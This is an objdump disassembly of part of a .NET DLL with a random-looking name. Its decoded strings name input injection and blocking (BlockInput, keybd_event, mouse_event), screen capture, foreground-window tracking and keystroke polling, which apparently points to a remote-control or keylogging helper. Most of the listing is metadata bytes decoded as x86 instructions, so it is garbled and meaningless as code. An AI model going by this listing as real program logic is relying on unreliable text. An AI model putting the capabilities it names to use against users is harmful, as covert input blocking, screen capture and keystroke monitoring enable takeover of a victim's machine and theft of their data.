100062fd:	0b 99 02 29 01 78    	or     0x78012902(%ecx),%ebx
10006303:	0b 3d 00 29 01 83    	or     0x83012900,%edi
10006309:	0b 25 01 89 00 8d    	or     0x8d008901,%esp
1000630f:	0b b4 02 29 01 94 0b 	or     0xb940129(%edx,%eax,1),%esi
10006316:	2a 01                	sub    (%ecx),%al
10006318:	39 00                	cmp    %eax,(%eax)
1000631a:	9d                   	popf
1000631b:	0b 6c 01 29          	or     0x29(%ecx,%eax,1),%ebp
1000631f:	01 a9 0b ba 02 89    	add    %ebp,-0x76fd45f5(%ecx)
10006325:	00 8d 0b be 02 f9    	add    %cl,-0x6fd41f5(%ebp)
1000632b:	00 06                	add    %al,(%esi)
1000632d:	0b c5                	or     %ebp,%eax
1000632f:	02 29                	add    (%ecx),%ch
10006331:	01 b4 0b 58 02 29 01 	add    %esi,0x1290258(%ebx,%ecx,1)
10006338:	c2 0b 6c             	ret    $0x6c0b
1000633b:	01 29                	add    %ebp,(%ecx)
1000633d:	01 ce                	add    %ecx,%esi
1000633f:	0b 58 02             	or     0x2(%eax),%ebx
10006342:	f9                   	stc
10006343:	00 dc                	add    %bl,%ah
10006345:	0b cd                	or     %ebp,%ecx
10006347:	02 61 01             	add    0x1(%ecx),%ah
1000634a:	ee                   	out    %al,(%dx)
1000634b:	0b d2                	or     %edx,%edx
1000634d:	02 61 01             	add    0x1(%ecx),%ah
10006350:	2d 06 d8 02 89       	sub    $0x8902d806,%eax
10006355:	00 8d 0b dd 02 29    	add    %cl,0x2902dd0b(%ebp)
1000635b:	01 f6                	add    %esi,%esi
1000635d:	0b 48 01             	or     0x1(%eax),%ecx
10006360:	89 00                	mov    %eax,(%eax)
10006362:	ff 0b                	decl   (%ebx)
10006364:	e5 02                	in     $0x2,%eax
10006366:	89 00                	mov    %eax,(%eax)
10006368:	8d 0b                	lea    (%ebx),%ecx
1000636a:	ec                   	in     (%dx),%al
1000636b:	02 89 00 8d 0b f2    	add    -0xdf47300(%ecx),%cl
10006371:	02 69 01             	add    0x1(%ecx),%ch
10006374:	0c 0c                	or     $0xc,%al
10006376:	0a 03                	or     (%ebx),%al
10006378:	69 01 28 0c 10 03    	imul   $0x3100c28,(%ecx),%eax
1000637e:	79 01                	jns    0x10006381
10006380:	45                   	inc    %ebp
10006381:	0c 16                	or     $0x16,%al
10006383:	03 71 01             	add    0x1(%ecx),%esi
10006386:	57                   	push   %edi
10006387:	0c 44                	or     $0x44,%al
10006389:	01 71 01             	add    %esi,0x1(%ecx)
1000638c:	5d                   	pop    %ebp
1000638d:	0c 44                	or     $0x44,%al
1000638f:	01 71 01             	add    %esi,0x1(%ecx)
10006392:	e4 0a                	in     $0xa,%al
10006394:	44                   	inc    %esp
10006395:	01 71 01             	add    %esi,0x1(%ecx)
10006398:	ee                   	out    %al,(%dx)
10006399:	0a 44 01 29          	or     0x29(%ecx,%eax,1),%al
1000639d:	01 63 0c             	add    %esp,0xc(%ebx)
100063a0:	25 01 29 01 6c       	and    $0x6c012901,%eax
100063a5:	0c 25                	or     $0x25,%al
100063a7:	01 81 01 9a 0c 6c    	add    %eax,0x6c0c9a01(%ecx)
100063ad:	01 39                	add    %edi,(%ecx)
100063af:	00 f0                	add    %dh,%al
100063b1:	00 3d 00 39 00 b5    	add    %bh,0xb5003900
100063b7:	0c 33                	or     $0x33,%al
100063b9:	03 39                	add    (%ecx),%edi
100063bb:	00 db                	add    %bl,%bl
100063bd:	0c 3a                	or     $0x3a,%al
100063bf:	03 99 01 f0 00 41    	add    0x4100f001(%ecx),%ebx
100063c5:	03 39                	add    (%ecx),%edi
100063c7:	00 f3                	add    %dh,%bl
100063c9:	0c 47                	or     $0x47,%al
100063cb:	03 a1 01 f0 00 41    	add    0x4100f001(%ecx),%esp
100063d1:	03 39                	add    (%ecx),%edi
100063d3:	00 05 0d 4e 03 39    	add    %al,0x39034e0d
100063d9:	00 0e                	add    %cl,(%esi)
100063db:	0d 6c 01 d9 00       	or     $0xd9016c,%eax
100063e0:	f0 00 3d 00 e1 00 f0 	lock add %bh,0xf000e100
100063e7:	00 3d 00 29 01 05    	add    %bh,0x5012900
100063ed:	0d 4e 03 f9 00       	or     $0xf9034e,%eax
100063f2:	20 0d cd 02 a9 01    	and    %cl,0x1a902cd
100063f8:	f0 00 60 01          	lock add %ah,0x1(%eax)
100063fc:	29 01                	sub    %eax,(%ecx)
100063fe:	42                   	inc    %edx
100063ff:	0d 55 03 29 01       	or     $0x1290355,%eax
10006404:	5e                   	pop    %esi
10006405:	0d 5c 03 b1 01       	or     $0x1b1035c,%eax
1000640a:	6b 0d 62 03 f9 00 6f 	imul   $0x6f,0xf90362,%ecx
10006411:	0d cd 02 b9 01       	or     $0x1b902cd,%eax
10006416:	f0 00 69 03          	lock add %ch,0x3(%ecx)
1000641a:	29 01                	sub    %eax,(%ecx)
1000641c:	7e 0d                	jle    0x1000642b
1000641e:	6f                   	outsl  %ds:(%esi),(%dx)
1000641f:	03 29                	add    (%ecx),%ebp
10006421:	01 87 0d 6c 01 f9    	add    %eax,-0x6fe93f3(%edi)
10006427:	00 94 0d cd 02 29 01 	add    %dl,0x12902cd(%ebp,%ecx,1)
1000642e:	f3 0c 47             	repz or $0x47,%al
10006431:	03 b9 01 f0 00 76    	add    0x7600f001(%ecx),%edi
10006437:	03 e1                	add    %ecx,%esp
10006439:	00 b9 0d 7f 03 d1    	add    %bh,-0x2efc80f3(%ecx)
1000643f:	01 d3                	add    %edx,%ebx
10006441:	0d a0 00 d1 01       	or     $0x1d100a0,%eax
10006446:	e0 0d                	loopne 0x10006455
10006448:	a0 00 d9 01 f0       	mov    0xf001d900,%al
1000644d:	00 3d 00 d9 01 f6    	add    %bh,0xf601d900
10006453:	0d 25 01 11 01       	or     $0x1110125,%eax
10006458:	f0 00 60 01          	lock add %ah,0x1(%eax)
1000645c:	d9 01                	flds   (%ecx)
1000645e:	03 0e                	add    (%esi),%ecx
10006460:	86 03                	xchg   %al,(%ebx)
10006462:	d9 01                	flds   (%ecx)
10006464:	d7                   	xlat   %ds:(%ebx)
10006465:	02 3d 00 d1 01 1c    	add    0x1c01d100,%bh
1000646b:	0e                   	push   %cs
1000646c:	90                   	nop
1000646d:	03 89 00 8d 0b 96    	add    -0x69f47300(%ecx),%ecx
10006473:	03 d9                	add    %ecx,%ebx
10006475:	00 36                	add    %dh,(%esi)
10006477:	0e                   	push   %cs
10006478:	9c                   	pushf
10006479:	03 a9 00 2d 06 48    	add    0x48062d00(%ecx),%ebp
1000647f:	01 39                	add    %edi,(%ecx)
10006481:	00 46 0e             	add    %al,0xe(%esi)
10006484:	86 03                	xchg   %al,(%ebx)
10006486:	09 01                	or     %eax,(%ecx)
10006488:	f0 00 60 01          	lock add %ah,0x1(%eax)
1000648c:	39 00                	cmp    %eax,(%eax)
1000648e:	4f                   	dec    %edi
1000648f:	0e                   	push   %cs
10006490:	a3 03 39 00 5f       	mov    %eax,0x5f003903
10006495:	0e                   	push   %cs
10006496:	86 03                	xchg   %al,(%ebx)
10006498:	f1                   	int1
10006499:	01 75 0e             	add    %esi,0xe(%ebp)
1000649c:	aa                   	stos   %al,%es:(%edi)
1000649d:	03 29                	add    (%ecx),%ebp
1000649f:	00 88 0e 2b 04 f1    	add    %cl,-0xefbd4f2(%eax)
100064a5:	01 dc                	add    %ebx,%esp
100064a7:	0e                   	push   %cs
100064a8:	39 00                	cmp    %eax,(%eax)
100064aa:	39 00                	cmp    %eax,(%eax)
100064ac:	e7 0e                	out    %eax,$0xe
100064ae:	3d 00 29 01 ed       	cmp    $0xed012900,%eax
100064b3:	0e                   	push   %cs
100064b4:	37                   	aaa
100064b5:	04 01                	add    $0x1,%al
100064b7:	02 f0                	add    %al,%dh
100064b9:	00 60 01             	add    %ah,0x1(%eax)
100064bc:	29 01                	sub    %eax,(%ecx)
100064be:	16                   	push   %ss
100064bf:	0f 3b                	(bad)
100064c1:	04 61                	add    $0x61,%al
100064c3:	00 f0                	add    %dh,%al
100064c5:	00 25 01 08 00 08    	add    %ah,0x8000801
100064cb:	00 44 00 08          	add    %al,0x8(%eax,%eax,1)
100064cf:	00 0c 00             	add    %cl,(%eax,%eax,1)
100064d2:	49                   	dec    %ecx
100064d3:	00 08                	add    %cl,(%eax)
100064d5:	00 28                	add    %ch,(%eax)
100064d7:	00 d3                	add    %dl,%bl
100064d9:	00 08                	add    %cl,(%eax)
100064db:	00 2c 00             	add    %ch,(%eax,%eax,1)
100064de:	d8 00                	fadds  (%eax)
100064e0:	08 00                	or     %al,(%eax)
100064e2:	30 00                	xor    %al,(%eax)
100064e4:	dd 00                	fldl   (%eax)
100064e6:	2e 00 13             	add    %dl,%cs:(%ebx)
100064e9:	00 44 04 2e          	add    %al,0x2e(%esp,%eax,1)
100064ed:	00 1b                	add    %bl,(%ebx)
100064ef:	00 4d 04             	add    %cl,0x4(%ebp)
100064f2:	e3 00                	jecxz  0x100064f4
100064f4:	03 01                	add    (%ecx),%eax
100064f6:	db 01                	fildl  (%ecx)
100064f8:	23 01                	and    (%ecx),%eax
100064fa:	03 01                	add    (%ecx),%eax
100064fc:	db 01                	fildl  (%ecx)
100064fe:	43                   	inc    %ebx
100064ff:	01 03                	add    %eax,(%ebx)
10006501:	01 db                	add    %ebx,%ebx
10006503:	01 61 02             	add    %esp,0x2(%ecx)
10006506:	03 01                	add    (%ecx),%eax
10006508:	db 01                	fildl  (%ecx)
1000650a:	81 02 03 01 db 01    	addl   $0x1db0103,(%edx)
10006510:	a1 02 03 01 db       	mov    0xdb010302,%eax
10006515:	01 c1                	add    %eax,%ecx
10006517:	02 03                	add    (%ebx),%al
10006519:	01 db                	add    %ebx,%ebx
1000651b:	01 60 07             	add    %esp,0x7(%eax)
1000651e:	03 01                	add    (%ecx),%eax
10006520:	db 01                	fildl  (%ecx)
10006522:	80 07 03             	addb   $0x3,(%edi)
10006525:	01 db                	add    %ebx,%ebx
10006527:	01 a0 07 03 01 db    	add    %esp,-0x24fefcf9(%eax)
1000652d:	01 c0                	add    %eax,%eax
1000652f:	07                   	pop    %es
10006530:	03 01                	add    (%ecx),%eax
10006532:	db 01                	fildl  (%ecx)
10006534:	01 00                	add    %eax,(%eax)
10006536:	0c 01                	or     $0x1,%al
10006538:	00 00                	add    %al,(%eax)
1000653a:	08 00                	or     %al,(%eax)
1000653c:	35 01 4c 01 5a       	xor    $0x5a014c01,%eax
10006541:	01 77 01             	add    %esi,0x1(%edi)
10006544:	a2 01 af 01 bb       	mov    %al,0xbb01af01
10006549:	01 cd                	add    %ecx,%ebp
1000654b:	01 d6                	add    %edx,%esi
1000654d:	01 69 02             	add    %ebp,0x2(%ecx)
10006550:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
10006551:	02 f9                	add    %cl,%bh
10006553:	02 1c 03             	add    (%ebx,%eax,1),%bl
10006556:	29 03                	sub    %eax,(%ebx)
10006558:	b0 03                	mov    $0x3,%al
1000655a:	06                   	push   %es
1000655b:	00 01                	add    %al,(%ecx)
1000655d:	00 00                	add    %al,(%eax)
1000655f:	00 6d 04             	add    %ch,0x4(%ebp)
10006562:	21 01                	and    %eax,(%ecx)
10006564:	02 00                	add    (%eax),%al
10006566:	35 00 03 00 da       	xor    $0xda000300,%eax
1000656b:	05 ec 05 f3 07       	add    $0x7f305ec,%eax
10006570:	8c 01                	mov    %es,(%ecx)
10006572:	8d 03                	lea    (%ebx),%eax
10006574:	00 01                	add    %al,(%ecx)
10006576:	03 00                	add    (%eax),%eax
10006578:	73 00                	jae    0x1000657a
1000657a:	01 00                	add    %eax,(%eax)
1000657c:	00 01                	add    %al,(%ecx)
1000657e:	05 00 80 00 01       	add    $0x1008000,%eax
10006583:	00 00                	add    %al,(%eax)
10006585:	01 07                	add    %eax,(%edi)
10006587:	00 8c 00 01 00 00 01 	add    %cl,0x1000001(%eax,%eax,1)
1000658e:	09 00                	or     %eax,(%eax)
10006590:	98                   	cwtl
10006591:	00 01                	add    %al,(%ecx)
10006593:	00 00                	add    %al,(%eax)
10006595:	01 1f                	add    %ebx,(%edi)
10006597:	00 09                	add    %cl,(%ecx)
10006599:	01 01                	add    %eax,(%ecx)
1000659b:	00 00                	add    %al,(%eax)
1000659d:	01 21                	add    %esp,(%ecx)
1000659f:	00 0f                	add    %cl,(%edi)
100065a1:	01 01                	add    %eax,(%ecx)
100065a3:	00 00                	add    %al,(%eax)
100065a5:	01 23                	add    %esp,(%ebx)
100065a7:	00 19                	add    %bl,(%ecx)
100065a9:	01 02                	add    %eax,(%edx)
100065ab:	00 00                	add    %al,(%eax)
100065ad:	01 25 00 2c 01 02    	add    %esp,0x2012c00
100065b3:	00 00                	add    %al,(%eax)
100065b5:	01 27                	add    %esp,(%edi)
100065b7:	00 43 01             	add    %al,0x1(%ebx)
100065ba:	02 00                	add    (%eax),%al
100065bc:	00 01                	add    %al,(%ecx)
100065be:	29 00                	sub    %eax,(%eax)
100065c0:	50                   	push   %eax
100065c1:	01 02                	add    %eax,(%edx)
100065c3:	00 00                	add    %al,(%eax)
100065c5:	01 2b                	add    %ebp,(%ebx)
100065c7:	00 57 01             	add    %dl,0x1(%edi)
100065ca:	02 00                	add    (%eax),%al
100065cc:	00 01                	add    %al,(%ecx)
100065ce:	2d 00 64 01 02       	sub    $0x2016400,%eax
100065d3:	00 00                	add    %al,(%eax)
100065d5:	01 33                	add    %esi,(%ebx)
100065d7:	00 8c 01 01 00 04 01 	add    %cl,0x1040001(%ecx,%eax,1)
100065de:	35 00 ba 01 01       	xor    $0x101ba00,%eax
100065e3:	00 00                	add    %al,(%eax)
100065e5:	01 37                	add    %esi,(%edi)
100065e7:	00 c8                	add    %cl,%al
100065e9:	01 01                	add    %eax,(%ecx)
100065eb:	00 00                	add    %al,(%eax)
100065ed:	01 39                	add    %edi,(%ecx)
100065ef:	00 dc                	add    %bl,%ah
100065f1:	01 01                	add    %eax,(%ecx)
100065f3:	00 00                	add    %al,(%eax)
100065f5:	01 41 00             	add    %eax,0x0(%ecx)
100065f8:	15 02 01 00 00       	adc    $0x102,%eax
100065fd:	01 43 00             	add    %eax,0x0(%ebx)
10006600:	26 02 01             	add    %es:(%ecx),%al
10006603:	00 00                	add    %al,(%eax)
10006605:	01 57 00             	add    %edx,0x0(%edi)
10006608:	4d                   	dec    %ebp
10006609:	03 01                	add    (%ecx),%eax
1000660b:	00 00                	add    %al,(%eax)
1000660d:	01 59 00             	add    %ebx,0x0(%ecx)
10006610:	66 03 01             	add    (%ecx),%ax
10006613:	00 00                	add    %al,(%eax)
10006615:	01 5b 00             	add    %ebx,0x0(%ebx)
10006618:	74 03                	je     0x1000661d
1000661a:	01 00                	add    %eax,(%eax)
1000661c:	00 01                	add    %al,(%ecx)
1000661e:	5d                   	pop    %ebp
1000661f:	00 82 03 01 00 00    	add    %al,0x103(%edx)
10006625:	01 5f 00             	add    %ebx,0x0(%edi)
10006628:	8f 03                	pop    (%ebx)
1000662a:	01 00                	add    %eax,(%eax)
1000662c:	00 01                	add    %al,(%ecx)
1000662e:	61                   	popa
1000662f:	00 a3 03 01 00 00    	add    %ah,0x103(%ebx)
10006635:	01 63 00             	add    %esp,0x0(%ebx)
10006638:	dc 01                	faddl  (%ecx)
1000663a:	01 00                	add    %eax,(%eax)
1000663c:	00 01                	add    %al,(%ecx)
1000663e:	65 00 8c 01 01 00 00 	add    %cl,%gs:0x1000001(%ecx,%eax,1)
10006645:	01 
10006646:	67 00 b4 03 01       	add    %dh,0x103(%si)
1000664b:	00 00                	add    %al,(%eax)
1000664d:	01 69 00             	add    %ebp,0x0(%ecx)
10006650:	c6 03 03             	movb   $0x3,(%ebx)
10006653:	00 c0                	add    %al,%al
10006655:	28 00                	sub    %al,(%eax)
10006657:	00 17                	add    %dl,(%edi)
10006659:	00 04 80             	add    %al,(%eax,%eax,4)
	...
1000666c:	be 05 00 00 04       	mov    $0x4000005,%esi
	...
10006679:	00 00                	add    %al,(%eax)
1000667b:	00 01                	add    %al,(%ecx)
1000667d:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
10006681:	00 00                	add    %al,(%eax)
10006683:	00 04 00             	add    %al,(%eax,%eax,1)
	...
1000668e:	00 00                	add    %al,(%eax)
10006690:	78 00                	js     0x10006692
10006692:	6d                   	insl   (%dx),%es:(%edi)
10006693:	01 00                	add    %eax,(%eax)
10006695:	00 00                	add    %al,(%eax)
10006697:	00 04 00             	add    %al,(%eax,%eax,1)
	...
100066a2:	00 00                	add    %al,(%eax)
100066a4:	01 00                	add    %eax,(%eax)
100066a6:	65 00 00             	add    %al,%gs:(%eax)
100066a9:	00 00                	add    %al,(%eax)
100066ab:	00 04 00             	add    %al,(%eax,%eax,1)
	...
100066b6:	00 00                	add    %al,(%eax)
100066b8:	01 00                	add    %eax,(%eax)
100066ba:	e6 03                	out    %al,$0x3
100066bc:	00 00                	add    %al,(%eax)
100066be:	00 00                	add    %al,(%eax)
100066c0:	08 00                	or     %al,(%eax)
100066c2:	07                   	pop    %es
100066c3:	00 09                	add    %cl,(%ecx)
100066c5:	00 06                	add    %al,(%esi)
100066c7:	00 0a                	add    %cl,(%edx)
100066c9:	00 06                	add    %al,(%esi)
100066cb:	00 00                	add    %al,(%eax)
100066cd:	00 00                	add    %al,(%eax)
100066cf:	00 00                	add    %al,(%eax)
100066d1:	3c 4d                	cmp    $0x4d,%al
100066d3:	6f                   	outsl  %ds:(%esi),(%dx)
100066d4:	64 75 6c             	fs jne 0x10006743
100066d7:	65 3e 00 35 78 6c 66 	gs add %dh,%ds:0x78666c78
100066de:	78 
100066df:	71 77                	jno    0x10006758
100066e1:	70 2e                	jo     0x10006711
100066e3:	64 6c                	fs insb (%dx),%es:(%edi)
100066e5:	6c                   	insb   (%dx),%es:(%edi)
100066e6:	00 4e 61             	add    %cl,0x61(%esi)
100066e9:	74 69                	je     0x10006754
100066eb:	76 65                	jbe    0x10006752
100066ed:	49                   	dec    %ecx
100066ee:	6e                   	outsb  %ds:(%esi),(%dx)
100066ef:	70 75                	jo     0x10006766
100066f1:	74 00                	je     0x100066f3
100066f3:	57                   	push   %edi
100066f4:	69 6e 5a 72 6e 4c 73 	imul   $0x734c6e72,0x5a(%esi),%ebp
100066fb:	48                   	dec    %eax
100066fc:	65 6c                	gs insb (%dx),%es:(%edi)
100066fe:	70 65                	jo     0x10006765
10006700:	72 00                	jb     0x10006702
10006702:	57                   	push   %edi
10006703:	69 6e 64 6f 77 4d 6f 	imul   $0x6f4d776f,0x64(%esi),%ebp
1000670a:	6e                   	outsb  %ds:(%esi),(%dx)
1000670b:	69 74 6f 72 00 49 6e 	imul   $0x706e4900,0x72(%edi,%ebp,2),%esi
10006712:	70 
10006713:	75 74                	jne    0x10006789
10006715:	54                   	push   %esp
10006716:	72 61                	jb     0x10006779
10006718:	63 6b 65             	arpl   %ebp,0x65(%ebx)
1000671b:	72 00                	jb     0x1000671d
1000671d:	44                   	inc    %esp
1000671e:	69 73 70 6c 61 79 4f 	imul   $0x4f79616c,0x70(%ebx),%esi
10006725:	76 65                	jbe    0x1000678c
10006727:	72 6c                	jb     0x10006795
10006729:	61                   	popa
1000672a:	79 00                	jns    0x1000672c
1000672c:	6d                   	insl   (%dx),%es:(%edi)
1000672d:	73 63                	jae    0x10006792
1000672f:	6f                   	outsl  %ds:(%esi),(%dx)
10006730:	72 6c                	jb     0x1000679e
10006732:	69 62 00 53 79 73 74 	imul   $0x74737953,0x0(%edx),%esp
10006739:	65 6d                	gs insl (%dx),%es:(%edi)
1000673b:	00 4f 62             	add    %cl,0x62(%edi)
1000673e:	6a 65                	push   $0x65
10006740:	63 74 00 53          	arpl   %esi,0x53(%eax,%eax,1)
10006744:	65 74 43             	gs je  0x1000678a
10006747:	75 72                	jne    0x100067bb
10006749:	73 6f                	jae    0x100067ba
1000674b:	72 50                	jb     0x1000679d
1000674d:	6f                   	outsl  %ds:(%esi),(%dx)
1000674e:	73 00                	jae    0x10006750
10006750:	6d                   	insl   (%dx),%es:(%edi)
10006751:	6f                   	outsl  %ds:(%esi),(%dx)
10006752:	75 73                	jne    0x100067c7
10006754:	65 5f                	gs pop %edi
10006756:	65 76 65             	gs jbe 0x100067be
10006759:	6e                   	outsb  %ds:(%esi),(%dx)
1000675a:	74 00                	je     0x1000675c
1000675c:	6b 65 79 62          	imul   $0x62,0x79(%ebp),%esp
10006760:	64 5f                	fs pop %edi
10006762:	65 76 65             	gs jbe 0x100067ca
10006765:	6e                   	outsb  %ds:(%esi),(%dx)
10006766:	74 00                	je     0x10006768
10006768:	42                   	inc    %edx
10006769:	6c                   	insb   (%dx),%es:(%edi)
1000676a:	6f                   	outsl  %ds:(%esi),(%dx)
1000676b:	63 6b 49             	arpl   %ebp,0x49(%ebx)
1000676e:	6e                   	outsb  %ds:(%esi),(%dx)
1000676f:	70 75                	jo     0x100067e6
10006771:	74 00                	je     0x10006773
10006773:	69 73 42 6c 6f 63 6b 	imul   $0x6b636f6c,0x42(%ebx),%esi
1000677a:	65 64 00 4d 6f       	gs add %cl,%fs:0x6f(%ebp)
1000677f:	76 65                	jbe    0x100067e6
10006781:	4d                   	dec    %ebp
10006782:	6f                   	outsl  %ds:(%esi),(%dx)
10006783:	75 73                	jne    0x100067f8
10006785:	65 00 4d 6f          	add    %cl,%gs:0x6f(%ebp)
10006789:	75 73                	jne    0x100067fe
1000678b:	65 44                	gs inc %esp
1000678d:	6f                   	outsl  %ds:(%esi),(%dx)
1000678e:	77 6e                	ja     0x100067fe
10006790:	00 4d 6f             	add    %cl,0x6f(%ebp)
10006793:	75 73                	jne    0x10006808
10006795:	65 55                	gs push %ebp
10006797:	70 00                	jo     0x10006799
10006799:	4d                   	dec    %ebp
1000679a:	6f                   	outsl  %ds:(%esi),(%dx)
1000679b:	75 73                	jne    0x10006810
1000679d:	65 57                	gs push %edi
1000679f:	68 65 65 6c 00       	push   $0x6c6565
100067a4:	4b                   	dec    %ebx
100067a5:	65 79 44             	gs jns 0x100067ec
100067a8:	6f                   	outsl  %ds:(%esi),(%dx)
100067a9:	77 6e                	ja     0x10006819
100067ab:	00 4b 65             	add    %cl,0x65(%ebx)
100067ae:	79 55                	jns    0x10006805
100067b0:	70 00                	jo     0x100067b2
100067b2:	42                   	inc    %edx
100067b3:	6c                   	insb   (%dx),%es:(%edi)
100067b4:	6f                   	outsl  %ds:(%esi),(%dx)
100067b5:	63 6b 00             	arpl   %ebp,0x0(%ebx)
100067b8:	55                   	push   %ebp
100067b9:	6e                   	outsb  %ds:(%esi),(%dx)
100067ba:	62 6c 6f 63          	bound  %ebp,0x63(%edi,%ebp,2)
100067be:	6b 00 2e             	imul   $0x2e,(%eax),%eax
100067c1:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
100067c5:	00 53 52             	add    %dl,0x52(%ebx)
100067c8:	43                   	inc    %ebx
100067c9:	43                   	inc    %ebx
100067ca:	4f                   	dec    %edi
100067cb:	50                   	push   %eax
100067cc:	59                   	pop    %ecx
100067cd:	00 43 41             	add    %al,0x41(%ebx)
100067d0:	50                   	push   %eax
100067d1:	54                   	push   %esp
100067d2:	55                   	push   %ebp
100067d3:	52                   	push   %edx
100067d4:	45                   	inc    %ebp
100067d5:	42                   	inc    %edx
100067d6:	4c                   	dec    %esp
100067d7:	54                   	push   %esp
100067d8:	00 47 65             	add    %al,0x65(%edi)
100067db:	74 44                	je     0x10006821
100067dd:	43                   	inc    %ebx
100067de:	00 52 65             	add    %dl,0x65(%edx)
100067e1:	6c                   	insb   (%dx),%es:(%edi)
100067e2:	65 61                	gs popa
100067e4:	73 65                	jae    0x1000684b
100067e6:	44                   	inc    %esp
100067e7:	43                   	inc    %ebx
100067e8:	00 43 72             	add    %al,0x72(%ebx)
100067eb:	65 61                	gs popa
100067ed:	74 65                	je     0x10006854
100067ef:	43                   	inc    %ebx
100067f0:	6f                   	outsl  %ds:(%esi),(%dx)
100067f1:	6d                   	insl   (%dx),%es:(%edi)
100067f2:	70 61                	jo     0x10006855
100067f4:	74 69                	je     0x1000685f
100067f6:	62 6c 65 44          	bound  %ebp,0x44(%ebp,%eiz,2)
100067fa:	43                   	inc    %ebx
100067fb:	00 43 72             	add    %al,0x72(%ebx)
100067fe:	65 61                	gs popa
10006800:	74 65                	je     0x10006867
10006802:	43                   	inc    %ebx
10006803:	6f                   	outsl  %ds:(%esi),(%dx)
10006804:	6d                   	insl   (%dx),%es:(%edi)
10006805:	70 61                	jo     0x10006868
10006807:	74 69                	je     0x10006872
10006809:	62 6c 65 42          	bound  %ebp,0x42(%ebp,%eiz,2)
1000680d:	69 74 6d 61 70 00 53 	imul   $0x65530070,0x61(%ebp,%ebp,2),%esi
10006814:	65 
10006815:	6c                   	insb   (%dx),%es:(%edi)
10006816:	65 63 74 4f 62       	arpl   %esi,%gs:0x62(%edi,%ecx,2)
1000681b:	6a 65                	push   $0x65
1000681d:	63 74 00 42          	arpl   %esi,0x42(%eax,%eax,1)
10006821:	69 74 42 6c 74 00 44 	imul   $0x65440074,0x6c(%edx,%eax,2),%esi
10006828:	65 
10006829:	6c                   	insb   (%dx),%es:(%edi)
1000682a:	65 74 65             	gs je  0x10006892
1000682d:	4f                   	dec    %edi
1000682e:	62 6a 65             	bound  %ebp,0x65(%edx)
10006831:	63 74 00 44          	arpl   %esi,0x44(%eax,%eax,1)
10006835:	65 6c                	gs insb (%dx),%es:(%edi)
10006837:	65 74 65             	gs je  0x1000689f
1000683a:	44                   	inc    %esp
1000683b:	43                   	inc    %ebx
1000683c:	00 53 79             	add    %dl,0x79(%ebx)
1000683f:	73 74                	jae    0x100068b5
10006841:	65 6d                	gs insl (%dx),%es:(%edi)
10006843:	2e 44                	cs inc %esp
10006845:	72 61                	jb     0x100068a8
10006847:	77 69                	ja     0x100068b2
10006849:	6e                   	outsb  %ds:(%esi),(%dx)
1000684a:	67 00 42 69          	add    %al,0x69(%bp,%si)
1000684e:	74 6d                	je     0x100068bd
10006850:	61                   	popa
10006851:	70 00                	jo     0x10006853
10006853:	47                   	inc    %edi
10006854:	72 61                	jb     0x100068b7
10006856:	62 76 42             	bound  %esi,0x42(%esi)
10006859:	74 6c                	je     0x100068c7
1000685b:	00 47 65             	add    %al,0x65(%edi)
1000685e:	74 46                	je     0x100068a6
10006860:	6f                   	outsl  %ds:(%esi),(%dx)
10006861:	72 65                	jb     0x100068c8
10006863:	67 72 6f             	addr16 jb 0x100068d5
10006866:	75 6e                	jne    0x100068d6
10006868:	64 57                	fs push %edi
1000686a:	69 6e 64 6f 77 00 53 	imul   $0x5300776f,0x64(%esi),%ebp
10006871:	79 73                	jns    0x100068e6
10006873:	74 65                	je     0x100068da
10006875:	6d                   	insl   (%dx),%es:(%edi)
10006876:	2e 54                	cs push %esp
10006878:	65 78 74             	gs js  0x100068ef
1000687b:	00 53 74             	add    %dl,0x74(%ebx)
1000687e:	72 69                	jb     0x100068e9
10006880:	6e                   	outsb  %ds:(%esi),(%dx)
10006881:	67 42                	addr16 inc %edx
10006883:	75 69                	jne    0x100068ee
10006885:	6c                   	insb   (%dx),%es:(%edi)
10006886:	64 65 72 00          	fs gs jb 0x1000688a
1000688a:	47                   	inc    %edi
1000688b:	65 74 57             	gs je  0x100068e5
1000688e:	69 6e 64 6f 77 54 65 	imul   $0x6554776f,0x64(%esi),%ebp
10006895:	78 74                	js     0x1000690b
10006897:	00 47 65             	add    %al,0x65(%edi)
1000689a:	74 57                	je     0x100068f3
1000689c:	69 6e 64 6f 77 54 65 	imul   $0x6554776f,0x64(%esi),%ebp
100068a3:	78 74                	js     0x10006919
100068a5:	4c                   	dec    %esp
100068a6:	65 6e                	outsb  %gs:(%esi),(%dx)
100068a8:	67 74 68             	addr16 je 0x10006913
100068ab:	00 47 65             	add    %al,0x65(%edi)
100068ae:	74 57                	je     0x10006907
100068b0:	69 6e 64 6f 77 54 68 	imul   $0x6854776f,0x64(%esi),%ebp
100068b7:	72 65                	jb     0x1000691e
100068b9:	61                   	popa
100068ba:	64 50                	fs push %eax
100068bc:	72 6f                	jb     0x1000692d
100068be:	63 65 73             	arpl   %esp,0x73(%ebp)
100068c1:	73 49                	jae    0x1000690c
100068c3:	64 00 47 65          	add    %al,%fs:0x65(%edi)
100068c7:	74 41                	je     0x1000690a
100068c9:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
100068cd:	65 54                	gs push %esp
100068cf:	69 74 6c 65 00 47 65 	imul   $0x74654700,0x65(%esp,%ebp,2),%esi
100068d6:	74 
100068d7:	41                   	inc    %ecx
100068d8:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
100068dc:	65 50                	gs push %eax
100068de:	72 6f                	jb     0x1000694f
100068e0:	63 65 73             	arpl   %esp,0x73(%ebp)
100068e3:	73 00                	jae    0x100068e5
100068e5:	47                   	inc    %edi
100068e6:	65 74 41             	gs je  0x1000692a
100068e9:	73 79                	jae    0x10006964
100068eb:	6e                   	outsb  %ds:(%esi),(%dx)
100068ec:	63 4b 65             	arpl   %ecx,0x65(%ebx)
100068ef:	79 53                	jns    0x10006944
100068f1:	74 61                	je     0x10006954
100068f3:	74 65                	je     0x1000695a
100068f5:	00 47 65             	add    %al,0x65(%edi)
100068f8:	74 4b                	je     0x10006945
100068fa:	65 79 53             	gs jns 0x10006950
100068fd:	74 61                	je     0x10006960
100068ff:	74 65                	je     0x10006966
10006901:	00 6c 61 73          	add    %ch,0x73(%ecx,%eiz,2)
10006905:	74 53                	je     0x1000695a
10006907:	74 61                	je     0x1000696a
10006909:	74 65                	je     0x10006970
1000690b:	00 53 79             	add    %dl,0x79(%ebx)
1000690e:	73 74                	jae    0x10006984
10006910:	65 6d                	gs insl (%dx),%es:(%edi)
10006912:	2e 43                	cs inc %ebx
